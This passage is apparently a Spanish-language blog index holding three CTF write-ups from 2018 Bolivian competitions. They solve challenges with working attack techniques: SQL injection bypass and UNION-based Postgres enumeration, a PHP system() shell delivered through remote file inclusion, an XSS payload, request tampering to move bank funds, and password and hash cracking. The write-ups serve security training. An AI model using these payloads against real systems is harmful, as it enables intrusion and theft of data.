archivo jsp principal Lastimosamente el ingeniero a cargo se fue a una planta en medio del mar y no nos puede decir la extensi√≥n con los que los guard√≥. El director de suministros requiere el backup con urgencia, me ayudas a identificar en que archivo esta?. Hazlo pronto mi cargo esta en juego Recuerda que las extensiones mas comunes de backups son:\nbak old bakup save En este hab√≠a que se algo observativos, tanto en la pista como en lo que tenemos frente a nosotros, nos dice el jsp principal, lo que vendria a significar el index.jsp ademas que la pagina actual es http://url/index.jsp\nAsi que probando con las extenciones que nos sugieren, se logra llegar a la respuesta\nhttp://url/index.jsp.bakup El cual contiene\n\u0026lt;%@ page contentType=\u0026#34;text/html; charset=UTF-8\u0026#34; pageEncoding=\u0026#34;UTF-8\u0026#34; language=\u0026#34;java\u0026#34; import=\u0026#34;java.sql.*,java.io.*,java.net.*,org.owasp.encoder.Encode, dbProcs.*, utils.*\u0026#34; errorPage=\u0026#34;\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Locale\u0026#34;%\u0026gt; \u0026lt;%@ include file=\u0026#34;translation.jsp\u0026#34; %\u0026gt; \u0026lt;% ShepherdLogManager.logEvent(request.getRemoteAddr(), request.getHeader(\u0026#34;X-Forwarded-For\u0026#34;), \u0026#34;DEBUG: index.jsp *************************\u0026#34;); Locale lang = new Locale(Validate.validateLanguage(request.getSession())); /** El flag/bandera es: 402051f4be0cc3aad33bcf3ac3d6532b */ %\u0026gt; entonces ahi es que nos da la flag\n402051f4be0cc3aad33bcf3ac3d6532b 1.4 Programa programador Uno de tus amigos te dej√≥ una pista en el desarrollo de c√≥digo java, pero debes resolver un acertijo matem√°tico antes de dar con el resultado. El flag/bandera es la clave para ingresar a su sistema (El n√∫mero menor que puedas encontrar). Pero esto es f√°cil para ti, total no son ecuaciones diferenciales\nnos dan un archivo en java\npackage exploit; import java.util.Scanner; public class KeithLikesToTroll { public static void main(String[] args){ int clave; Scanner scn = new Scanner(System.in); System.out.print(\u0026#34;Introdusca la llave: \u0026#34;); clave = scn.nextInt(); scn.close(); if(1338557220 / clave * clave != 1338557220 \u0026amp;\u0026amp; clave \u0026gt; 0){ System.out.println(\u0026#34;Autenticacion correcta. La bandera es un n√∫mero peque√±o que te dejara entrar.\u0026#34;); }else{ System.out.println(\u0026#34;Autenticacion incorrecta.\u0026#34;); } } } El cual habr√≠a q compilarlo y ejecutarlo de manera q el menor numero resultante de correcto, con fuerza bruta se puede llegar r√°pidamente a este.\nLa Flag:\n8 1.5 Wifi admin panel Estamos de vacaciones en el Caribe, lastimosamente por culpa de tu amigo el vuelo nos acaba de dejar y son 5 largas horas de espera en el aeropuerto. Otro de tus amigos se dio cuenta que pueden ingresar a internet gratis en el aeropuerto pero para ello debes ingresar al router ¬ø Te animas a probar como loguearte?\nPara esto necesitamos observar bien, y la pista que nos dan es SMC Networks, el cual es una marca que produce Routers entre otras cosas, el cual con un poco de busqueda tenemos algunas combinaciones de Usuarios y Contrase√±as por defecto el cual probamos hasta hallar el correcto y conseguir la flag\nNivel 2 2.1 Esteganografia Sab√≠as que la t√©cnica de ocultar mensajes u objetos dentro de im√°genes de modo que no se perciba su existencia es esteganografia?. A nosotros nos encanta esta t√©cnica. As√≠ que dejare esta imagen por aqu√≠ y me ir√© muy lentamente\nimagen para descargar Este al principio nos desconcert√≥, sin embargo la soluci√≥n es extrayendo cada cadena de caracteres imprimible en la imagen, usando strings desde consola(en Linux) strings 8c373fd1a.jpeg Y la Flag:\n1e5b77443345620c52d23c73dc87521c 2.2 Forense Un peligroso delincuente esta pasando mensajes ocultos en los pdf que env√≠a su c√≥mplice en el extranjero. Puedes hacer un an√°lisis, ya casi eres un hacker Encontraste tu bandera?Descargar documento En este caso, analizar los metadatos nos da el bot√≠n; Con el uso de Exiftool :\nexiftool CIDSI2018.pdf Y la Flag:\nc47d187067c6cf9 2.3 Inyecci√≥n SQL Sabemos que el coyote compra todos sus artefactos de ACME, nos ayudas a mostrar todas las tuplas de la tabla para encontrar la trampa con la que finalmente atrape a su n√©mesis?\nAl ver este pens√© que llevar√≠a un tiempo, sin embargo al intentar cualquier inyecci√≥n aparec√≠a una copia de la consulta realizada en la parte superior, muy al estilo Bricks. Por lo cual hallar la soluci√≥n fue muy r√°pido, con una t√≠pica inyecci√≥n de bypass.\n\u0026#39;)or(\u0026#39;1\u0026#39;)=(\u0026#39;1 Lo cual nos dio la Flag.\n2.4 Ingenier√≠a inversa Una de los peligros mas grandes en aplicaciones m√≥viles es la ingenier√≠a inversa. Porque podemos inspeccionar el c√≥digo fuente y encontrar llaves de API, passwords, etc. Encontramos un archivo apk mientras revisabas recursos compartidos, por suerte lo guardamos ahora queremos saber que contiene Sera que puedes con el reto?. Existen varias herramientas para hacer ingenier√≠a inversa a un archivo APKDescargar APK Como menciona en el enunciado, existen varias herramientas, prefer√≠ usar Apktool apktool d reversing.apk lo cual nos brinda una carpeta con todo lo extraido, en el cual se puede realizar una busqueda r√°pida con grep user@pc:# grep \u0026#34;bandera\u0026#34; . -R ./reversing/smali/com/mobshep/reverseengineer/Reverse_Engineering.smali: const-string v0, \u0026#34;El flag/bandera es 9yfdsj3md0lq75\u0026#34; y la Flag!\n9yfdsj3md0lq75 Nivel 3 3.1 An√°lisis de trafico 2 Estamos realizando un an√°lisis de tr√°fico porque detectamos que alguien esta filtrando informaci√≥n confidencial y es tan grande la cantidad de informaci√≥n que encima la comprimieron protegido por contrase√±a, pero hallar el password es f√°cil para ti. Ayudanos a encontrar el password que nos ayude a tener acceso a nuestra banderaDescargar captura Encontrar el zip no fue dif√≠cil, solo hab√≠a que exportarlo con Export Packet Bytes o exportando todos los objetos. Una vez llegado a este punto el zip que obtenemos esta protegido con contrase√±a como menciona el enunciado, para eso tuvimos que observar la captura\nla contrase√±a del zip\nazulcrema y la flag!!\nIW{HTTP_BASIC_AUTH_IS_EASY} 3.2 Lista de usuarios Un grupo de usuarios decidi√≥ quejarse porque no hay caf√© en la cafeter√≠a, puedes creerlo?. Y uno de los usuarios parece que es el que se esta robando el caf√©, claro que el muy vivo se oculto de la lista. Me ayudas a encontrarlo y devolver el caf√© a nuestras vidas\nEn este demore en darme cuenta, nos daban a elegir entre consultar la informaci√≥n de 5 usuarios, sin embargo, no hab√≠a algo relevante entre ellos, intente buscar inspeccionando los elementos, y las peticiones, sin embargo la pista estaba en como se realizaban las peticiones.\nPOST /challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4 HTTP/1.1 Host: 192.168.3.100 Accept: ** Accept-Language: en-US,en:q-0.5 Accept-Encoding: gzip, deflate Referer: https://192.168.3.100/challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646eOf313a4.jsp Content-Type: application/X-wWW-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 45 Connection: close userId%5B%5D=cfcd208495d565ef66e7dff9f98764da La petici√≥n se identificaba de esta manera: cfcd208495d565ef66e7dff9f98764da, lo cual al verificar era un MD5 y en valor 0 en texto plano:\ncfcd208495d565ef66e7dff9f98764da = 0 Al verificar los dem√°s, funcionaban de la misma forma, as√≠ que genere una lista de n√∫meros hasheados en MD5 para hacer peticiones hasta encontrar el usuario oculto, el cual no era mas del numero 20.\n3.3 HASHDUMP Encontrar la contrase√±a de administracion\nsistemas:500:9E689B23C4D33D88E4C560258374B547:7E058F739B8A1E67C00815FC1E5E0E25::: Guest:501:NO PASSWORD*********************:NO PASSWORD*********************::: nonadmin:1005:NO PASSWORD*********************:0CF3760C0B0EB9F570AACE7040DF6DB7::: contabilidad:1013:23AC1B85C36D31AAE45E0AE1804A24B0:DE6D8B1780A4F0714242AC53A6C2B2E8::: administrador:1014:CE9F401800DF01AFFF959C003A9671D0:A7B9ECDD64AA492E449E0A619FD16E4B::: gerencia:1015:4978646A5C99C2834D6A97A372D4BC83:C7994B298128024418AD0E9C5038570C::: Podemos ver que es un dump de los hashes de Windows(NTLM)\nEste tomo tiempo darse cuenta del truco, a simple vista uno piensa que la cuenta de administraci√≥n seria la que lleva tal nombre o similar, sin embargo el truco estaba en el RID . El 500 pertenece a la cuenta de administraci√≥n creada durante la instalacion de Sistema Operativo, apesar que en este caso se llama sistemas\nEntonces nos queda 2 v√≠as encontralo por fuerza bruta/diccionario o buscarla, para ganar tiempo mejor buscarla y as√≠ tenemos, la flag!\ncoldplay Nivel 4 4.1 Cracking rar Los usuarios de la aseguradora SEGURITAS tienen loco al personal de sistemas con sus famosos cambios. Como si fueran a cambiar el mundo. Si eres astuto podr√°s acceder a la bandera que esta compreso y protegido con contrase√±a Un empleado de sistemas tiene una pista para ti. Su id de una popular red social es 0x5afa18273c14\nDescargar Primero el id debemos convertirlo del Hexadecimal, entonces obtenemos: 100030193548308\nAhora en facebook buscamos el perfil: https://www.facebook.com/100030193548308 en el cual encontramos fotograf√≠as del empleado difundiendo informaci√≥n critica de la empresa como que para archivos rar la contrase√±a debe ser un numero de longitud 5, entonces lo √∫nico que nos queda es crackear el rar con un diccionario con todas las posibilidades de 5 d√≠gitos numerales con John The Ripper .\njohn --wordlist=six --format=rar5 hashrar hashrar es el file donde se encuentra el hash del RAR, entonces, tenemos la contrase√±a.\n60372 Con esto podemos sacar la flag dentro del comprimido:\n8743b52063cd84097a65d1633f5c74f5 4.2 Sitio web banco Para completar este reto debes crearte una cuenta de banco y trasferirle mas de 10000 bs. Cuando tengas esa cantidad en tu cuenta de banco, simplemente deslogeate y logueate de nuevo para que se te recompense con el flag/bandera Para empezar hay que registrarse, y en la plataforma nos da la posibilidad de transferir dinero a otras cuentas\nSin embargo interceptando las peticiones era inseguras, similar a esto:\ncuentaOrigen=4\u0026amp;cuentaDestino=2\u0026amp;monto=1200 entonces modificando la petici√≥n, podemos invertir esto\ncuentaOrigen=2\u0026amp;cuentaDestino=4\u0026amp;monto=1200 de esta manera nos transferimos dinero a nosotros mismos, ahi el resultado:\nVoil√†!\n0738FF78AE98A11F579A70F3F98468097426D4652B32A5F978818FC9CCB66CE74371A28833CC1A52854697C734D66249DB8E9AAB67F024262436EC8220C9OF11 Nivel 5 5.1 Exploiting Estamos haciendo un desarrollo seguro, Tu reto es cambiar el flujo del programa para que se ejecute la funci√≥n oculta vencer Una vez que lo logres te felicitare por tu √©xito. La bandera es la direcci√≥n hexadecimal de la funci√≥n vencer con el formato correcto (0x11223344)Descargar programa Para este ten√≠amos que utilizar IdaPro , y buscar la direcci√≥n.\n0x080484BB Y esito seria!\nSin embargo no pudimos sacar el 1er puesto por seis puntos, por el tema que quienes resolv√≠an primero un reto ten√≠an puntos extras, pero quedamos muy contentos con el gran equipo que formamos; quedando en 2do lugar entre tantos equipos.\nCualquier duda, consulta o reclamo pueden escribirme , espero les gustara el WriteUp.\n-Hackers are People Too üòú\nlinks de inter√©s Tabla completa de posiciones de pregrado/posgrado, click aqui los retos eran los mismos para ambos grados\nPara ver informaci√≥n de evento aqui links de la Serie CTF UMSS WriteUp WirteUp Demo CTF CIDSI 2018 ","permalink":"https://drayko.github.io/es/post/writeup-cidsi18/","tags":[{"LinkTitle":"CTF","RelPermalink":"/es/tags/ctf/"},{"LinkTitle":"WriteUp","RelPermalink":"/es/tags/writeup/"},{"LinkTitle":"Featured","RelPermalink":"/es/tags/featured/"}],"title":"WriteUp CTF CIDSI 2018"},{"categories":[],"content":"Esta es la segunda parte de la serie de CTFs rumbo al CIDSI 2018. Esta vez el CTF fue realizado en la Universidad Mayor de San Sim√≥n (UMSS), manera de eliminatorias para los que ir√≠amos al evento(CIDSI) representando a nuestra universidad\nEste CTF fue organizado por la Sociedad Cient√≠fica de Estudiantes de Sistemas e Inform√°tica (SCESI -UMSS) con el apoyo de la Jefatura de Carreras de Inform√°tica y Sistemas de la Universidad Mayor de San Sim√≥n (UMSS), adem√°s de @crhystamil quien fue el que realizo los retos, muchas gracias por tan buenos retos!\nEstuvo alojado en la plataforma de FBCTF , y participamos en equipo como Dark Army con Israel , Rafael y mi persona , logrando el 1er puesto, sin mas pre√°mbulos, empecemos!\n1.-\nproblema:ZmxhZ3tVTVNTX2VkdV9TY2VzaV9DdGZ9Cg==\nsoluci√≥n: Algo sencillo para empezar, como podemos ver, la solucion esta en Base64\nLa flag es:\nflag{UMSS_edu_Scesi_Ctf} 2.-\nSe muy observador y encuentra el flag para este reto.\nsoluci√≥n: Bueno, en el problema nos da un login: Podr√≠amos intentar mas de una forma de burlar el login, pero primero revisemos el c√≥digo fuente, nos muestra que el login esta siendo verificado con Javascript:\nvar _0x9045=[\u0026#34;\\x76\\x61\\x6C\\x75\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x6E\\x61\\x6D\\x65\u0026#34;,\u0026#34;\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\u0026#34;,\u0026#34;\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\u0026#34;,\u0026#34;\\x45\\x48\\x43\u0026#34;,\u0026#34;\\x4D\\x33\\x52\\x6F\\x61\\x57\\x4D\\x30\\x62\\x46\\x39\\x6F\\x4E\\x47\\x4E\\x72\\x4D\\x57\\x35\\x6E\u0026#34;,\u0026#34;\\x46\\x4C\\x41\\x47\\x20\\x65\\x6E\\x63\\x6F\\x6E\\x74\\x72\\x61\\x64\\x61\\x21\\x21\\x2C\\x20\\x69\\x6E\\x67\\x72\\x65\\x73\\x61\\x20\\x65\\x6C\\x20\\x66\\x6C\\x61\\x67\\x20\\x65\\x6E\\x20\\x65\\x6C\\x20\\x66\\x6F\\x72\\x6D\\x61\\x74\\x6F\\x20\\x66\\x6C\\x61\\x67\\x7B\\x2E\\x2E\\x2E\\x2E\\x7D\u0026#34;,\u0026#34;\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\u0026#34;,\u0026#34;\\x69\\x6E\\x64\\x65\\x78\\x2E\\x68\\x74\\x6D\\x6C\u0026#34;,\u0026#34;\\x59\\x6F\\x75\\x20\\x68\\x61\\x76\\x65\\x20\\x6C\\x65\\x66\\x74\\x20\u0026#34;,\u0026#34;\\x20\\x61\\x74\\x74\\x65\\x6D\\x70\\x74\\x3B\u0026#34;,\u0026#34;\\x64\\x69\\x73\\x61\\x62\\x6C\\x65\\x64\u0026#34;,\u0026#34;\\x73\\x75\\x62\\x6D\\x69\\x74\u0026#34;];var attempt=3;function validate(){var _0xd22bx3=document[_0x9045[2]](_0x9045[1])[_0x9045[0]];var _0xd22bx4=document[_0x9045[2]](_0x9045[3])[_0x9045[0]];if(_0xd22bx3== _0x9045[4]\u0026amp;\u0026amp; _0xd22bx4== atob(_0x9045[5])){alert(_0x9045[6]);window[_0x9045[7]]= _0x9045[8];return false}else {attempt--;alert(_0x9045[9]+ attempt+ _0x9045[10]);if(attempt== 0){document[_0x9045[2]](_0x9045[1])[_0x9045[11]]= true;document[_0x9045[2]](_0x9045[3])[_0x9045[11]]= true;document[_0x9045[2]](_0x9045[12])[_0x9045[11]]= true;return false}}} Sin embargo esta ofuscado, podemos buscar muchos sitios en linea para desofuscarlo y tenerlo mas comprensible:\nvar attempt = 3; function validate() { var _0xd22bx3 = document[\u0026#39;getElementById\u0026#39;](\u0026#39;username\u0026#39;)[\u0026#39;value\u0026#39;]; var _0xd22bx4 = document[\u0026#39;getElementById\u0026#39;](\u0026#39;password\u0026#39;)[\u0026#39;value\u0026#39;]; if (_0xd22bx3 == \u0026#39;EHC\u0026#39; \u0026amp;\u0026amp; _0xd22bx4 == atob(\u0026#39;M3RoaWM0bF9oNGNrMW5n\u0026#39;)) { alert(\u0026#39;FLAG encontrada!!, ingresa el flag en el formato flag{....}\u0026#39;); window[\u0026#39;location\u0026#39;] = \u0026#39;index.html\u0026#39;; return false } else { attempt--; alert(\u0026#39;You have left \u0026#39; + attempt + \u0026#39; attempt;\u0026#39;); if (attempt == 0) { document[\u0026#39;getElementById\u0026#39;](\u0026#39;username\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; document[\u0026#39;getElementById\u0026#39;](\u0026#39;password\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; document[\u0026#39;getElementById\u0026#39;](\u0026#39;submit\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; return false } } } Podemos analizar que el username es: EHC, y el password esta oculto en Base64(atob ): 3thic4l_h4ck1ng. Entonces el login nos dice que la flag es la password con el formato flag{...}:\nflag{3thic4l_h4ck1ng} 3.-\nfile_5e9666c7a0773f3785123f19986b4c5f\nnos dan un archivo de texto, el cual contiene lo siguiente como podemos observar, se trata de un hexdump, podriamos revertirlo con xxd:\nxxd -r file_5e9666c7a0773f3785123f19986b4c5f \u0026gt; myfile el cual nos da una imagen:\ny directamente nos da la flag\nflag{FL4g_Facil_o_Difici1} 4.-\nSQLi\nsoluci√≥n: bueno\u0026hellip; nos dio un login con captcha de google, realmente odie este reto y ni que decir de mi equipo, gracias @crhystamil :) jejeje, pero, continuemos, claramente se trataba de hacer una inyeccion SQL, sin embargo probamos con el tipico admin:admin el cual nos daba una respuesta de Buen_Intento_Pero_EsteNo_esEl_Flag, con esto se podia deducir que era un usuario valido pero no el que buscamos.\nDespues de varios intentos con sentencias MySql\u0026hellip; probe con Postgres con admin como password, para cumplir una consulta valida por supuesto\n-\u0026#39; UNION ALL SELECT NULL,NULL,current_database(),NULL-- nos responde con ctf :D\nAhora continuamos intentando llamar a las tablas existentes.\n-\u0026#39; UNION ALL SELECT NULL,NULL,table_name,NULL FROM information_schema.tables LIMIT 1 OFFSET 0-- respuesta: users por suerte nos salta la tabla que queremos al primer intento, sin embargo, no nos deja hacer las peticiones directamente, sino mas bien encodeandola.\nusers =\u0026gt; CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115) Lo cual seria en base ASCII .\nQuedaria algo asi:\n-\u0026#39; UNION ALL SELECT NULL,NULL,column_name,NULL FROM information_schema.columns where table_name=CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115) LIMIT 1 OFFSET 0-- Entonces en las respuestas vamos enumerando aumentando el OFFSET, las columnas que pueden sernos utiles: id, users, pass, flag. Con esta ultima ya vamos a un solo paso de lograrla, sin embargo\u0026hellip;\n-\u0026#39; UNION ALL SELECT NULL,NULL,flag,NULL FROM ctf.public.users LIMIT 1 OFFSET 29-- La respuesta se encontraba hasta el intento 29, nuevamente gracias @crhystamil .\nla flag:\nDJC{Buen_Intento_esEl_Flag} 5.-\nCuidado con ejecutar todo\nen este caso nos da un host en el cual esta ejecutando hasta las imagenes que tiene, lo cual es una mala practica obviamente, nos da la puerta a un RFI , asi que desde un servidor remoto tratamos de ubicar la flag con una shell rapida\n\u0026lt;?php system(‚Äòls‚Äô); ?\u0026gt; el cual nos muestra los archivos en el directorio actual, en el cual existia un archivo el cual al leerlo nos daba el flag, simplemente cambiando el la URL por el archivo que lo contiene -2s3d5f6g7g549fy4nfp734lk37-\nLa flag:\nflag{3hc_gr0up_h4ck1ng_Dragonjar} 6.-\nan√°lisis de firmware\nnos dan una imagen para analizarla: open-hacking_151b4da179e4163e7e879da22e0c76e2.bin\nLa cual podremos analizarla para extraer los archivos que contenga con Binwalk\nbinwalk -Me open-hacking_151b4da179e4163e7e879da22e0c76e2.bin Entonces podemos analizar, y conseguimos la flag:\nbandera{43320192606d672bf0db1280026c799902f03bdd} creo que eso seria :D sin embargo no son todos los problemas, no pudimos completarlos :( y gracias a @crhystamil ! por preparar este divertido CTF :D\nel siguiente write up es el de CIDSI!\n-Hackers are People Too üòú\nlinks de la Serie\nEl anterior WriteUp(CIDSI Demo WriteUp ) WriteUp CTF CIDSI18 ","permalink":"https://drayko.github.io/es/post/writeup-ctfumss18/","tags":[{"LinkTitle":"CTF","RelPermalink":"/es/tags/ctf/"},{"LinkTitle":"WriteUp","RelPermalink":"/es/tags/writeup/"}],"title":"Write Up CTF UMSS 2018"},{"categories":[],"content":"Que tal?!\nEste es el inicio de una serie de posts de CTFs que fueron rumbo al Congreso Internacional De Seguridad Inform√°tica (CIDSI)\nque fue organizado por la Agencia de Gobierno Electr√≥nico y Tecnolog√≠as de Informaci√≥n y Comunicaci√≥n (AGETIC) gracias a las gestiones del Centro de Gesti√≥n de Incidentes Inform√°ticos(CGII) realizado del 29 de Noviembre al 1 de Diciembre del 2018\nEmpezamos con el primer CTF organizado como demo por el CGII.\n1. Introducir el flag\nEste solo es un reto demostrativo para mostrar como funciona la plataforma.\nEl reto solo consiste en enviar la bandera (flag) La bandera (Flag) es: 327a6c4304ad5938eaf0efb6cc3e53dc\nsoluci√≥n: En el enunciado nos dan directamente la Flag:\n327a6c4304ad5938eaf0efb6cc3e53dc 2. Web site\nAhora el reto sera un poco mas \u0026ldquo;dificil\u0026rdquo;. Uno de los programadores de la AGETIC quizo darte una ayuda y te dejo una pista del flag en el sitio del evento. Link: https://www.cgii.gob.bo/eventos/cidsi2018/ soluci√≥n: Debemos examinar el c√≥digo de la pagina, podemos inspeccionar presionando F12 u Ctrl+U Entonces la flag es:\n8ddeb2027a8c79b3c46510a6dcef9dda 3. Panel administrativo\nMalas configuraciones de seguridad.\nLos desarrolladores usualmente usan passwords por defecto o f√°ciles de adivinar.\nEstas comenzando a desarrollar tus habilidades de hacker, en eso vas de visita a una empresa y te conectas a su red interna. ¬°Sorpresa! encontraste el panel de administraci√≥n de su sistema de personal. Tu reto: debes logearte como administrador, si lo logras un flag sera tu recompenza.\nsoluci√≥n: existen muchas combinaciones de usuarios y contrase√±as por defecto o usuales, por ejemplo la siguiente lista .\npero probemos uno de los mas usuales el t√≠pico admin/admin\nestupendo! esta es la flag:\n58FD79FEF76B8D579819C5FA615A25930F111C04627C3F374C5D7DF898A5FEADE1598AA0680BDF5B922ACBE396691FD1943A181E362F32FFCC0B29A6DD725BA0 4. Cracking\nCrackeando el hash\nHoy en dia el algoritmo de encriptaci√≥n MD5 ya no es considerado seguro.\nUn amigo hacker esta realizando un evaluaci√≥n de seguridad (Ethical hacking), tuvo acceso a una base de datos de usuarios y si logra acceder con algun usuario podra ganar privilegios y mantener muchos m√°s accesos. Te pide ayuda para \u0026ldquo;romper\u0026rdquo; un hash, no actualizado por suerte. Si puedes ayudarlo, tu recompenza es la bandera (flag) que es el texto plano (sin encriptar) del hash 3cc31cd246149aec68079241e71e98f6\nsoluci√≥n: Buscamos en Google el hash y por suerte, muchas paginas tienen ya almacenado ese. Caso contrario tenemos herramientas como Hashcat o el cl√°sico John The Ripper. Por suerte la respuesta esta en Google.\nPa$$w0rd 5. Cracking 2\nEstas de vacaciones en un hotel 5 estrellas. A un amigo tuyo se le ocurrio capturar trafico con la herramienta wireshark y para la alegria del grupo pudo capturar el ingreso de un empleado a la intranet donde estan las promociones para ganar noches gratis en el hotel. Lamentablemente el password parece estar \u0026ldquo;encriptado\u0026rdquo;, pero esto es f√°cil para ti, si lo descubres el password es la bandera. El hash capturado es : ODcwMzM2NzA5ODUwMDUzNA==\nsoluci√≥n: Si tienes mas experiencia se puede notar a simple vista q es un Base64, o en su defecto pero poco probable un Base 32, sin embargo existen muchos identificadores de encodeados, buscalos en Google ;)\nLa flag es:\n8703367098500534 6. Cracking 3\nHaciendo pruebas de captura de tr√°fico capturas lo que aparentemente es un hash: MNQXA4TJMNXXE3TJN4======\nTu misi√≥n es obtener el texto plano de ese \u0026ldquo;hash\u0026rdquo;\nPista: El algoritmo usado para este reto es la \u0026ldquo;mitad de dificil\u0026rdquo; de base64.\nsoluci√≥n: En el enunciado nos dan la pista de base32 La flag es:\ncapricornio 7. Cracking 4\nUn amigo esta haciendo un postgrado en seguridad de la informaci√≥n pero se falto a la primera clase de criptografia y te pide ayuda para resolver su tarea que es decodificar el texto : ynivqnrftravny\nPista: Si hoy fuera \u0026ldquo;martes 13\u0026rdquo; las cosas serian mas f√°ciles.\nsoluci√≥n: La pista hace referencia a ROT13 o cifrado cesar, podemos buscar en Google una pagina para decodear ROT13, comprobamos y efectivamente es :D\nLa flag es:\nlavidaesgenial 8. Buscar usuario\nMuy a menudo los programadores no sanitizan las entradas por parte de un usuario.\nEncontramos un sitio en linea, que te ofrece invitaciones VIP a eventos especiales, para poder acceder a ellos necesitas mostrar un alert con javascript. Obviamente debes ejecutarlo. ¬øTe animas a probar? Sabemos que eres un programador experto. Si lo logras el flag sera tu premio.\nsoluci√≥n: Nos sugiere un ataque de XSS , intentemos algo sencillo, introducir directamente el script\n\u0026lt;script\u0026gt;alert(\u0026#34;XSS\u0026#34;)\u0026lt;/script\u0026gt; y nos resulta! :D\ny la respectiva respuesta\nLa flag:\n11B0C9EBB6D5A0E0E4AE5B1F604B9E8111FEDF991173667AEB2D14F91ACC3B62FB6A5FD4E9AF37BAF09932150BF0D89A3B89F2B9F135347799D95DB38A4AC515 9. Ver perfil\nVamos avanzando, la empresa de chocolates esta realizando envios gratuitos a una lista aleatorea y son muchos chocolates. Para entrar al sistema que contiene la lista. Debes cambiar el permiso porque ahora solo tienes el rol de t√©cnico, pero si eres administrador podria tener todo el chocolate que quieras. Tu reto es tener acceso al perfil del administrador. Tu recompenza adem√°s del chocolate es el flag que es la persona de contacto.\nsoluci√≥n: Examinemos las cabeceras de la petici√≥n que se env√≠a al darle a \u0026ldquo;Actualiza tu perfil\u0026rdquo;\nPOST /eventos/cidsi2018/ctfdemo/lessons/fdb94122d0f032821019c7edf09dc62ea21e25ca619ed9107bcc50e4a8dbc100 HTTP/1.1 Host: www.cgii.gob.bo Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://www.cgii.gob.bo/eventos/cidsi2018/ctfdemo/lessons/fdb94122d0f032821019c7edf09dc62ea21e25ca619ed9107bcc50e4a8dbc100.jsp Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 16 Connection: close username=tecnico Como nos sugiere en el enunciado tratemos de acceder al administrador, si modificamos el username a:\nusername=administrador Voil√†! la flag es:\nE762A4B454B64E50ED992465C1FBD424A5FB7184E9AA89B901D9ACD9B311AB3D927647D3BBC1BC52BDDEC560A005F72638F2C69D0D60169EBF621ABE8BF14A74 Como dir√≠amos en Bolivia\u0026hellip; esito seria. Los siguientes Write Ups se ir√°n publicando pronto, e indexando aqu√≠ y en cada uno de ellos. Hasta la pr√≥xima!\n-Hackers are People Too üòú\nlinks de la Serie\nCTF UMSS WriteUp WirteUp CTF CIDSI18 ","permalink":"https://drayko.github.io/es/post/writeup-democidsi18/","tags":[{"LinkTitle":"CTF","RelPermalink":"/es/tags/ctf/"},{"LinkTitle":"WriteUp","RelPermalink":"/es/tags/writeup/"}],"title":"Write Up del CTF Demo CIDSI 2018"}]